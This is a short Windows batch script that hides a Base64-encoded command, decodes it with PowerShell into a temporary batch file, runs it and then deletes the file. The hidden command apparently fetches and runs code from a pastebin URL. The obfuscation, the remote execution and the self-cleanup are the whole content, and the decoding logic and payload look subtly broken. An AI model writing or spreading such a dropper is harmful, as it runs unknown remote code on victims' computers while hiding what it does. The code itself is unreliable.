@echo off
setlocal enabledelayedexpansion

:: Base64-encoded payload (encrypted command)
set "encoded_command=aQBlAG0AIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAHcAdgAxAEgAdgBHNABUAA=="

:: Decode the Base64 command and execute it
echo !encoded_command! | powershell -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content -)))" > temp.bat
call temp.bat

:: Clean up
del temp.bat
exit
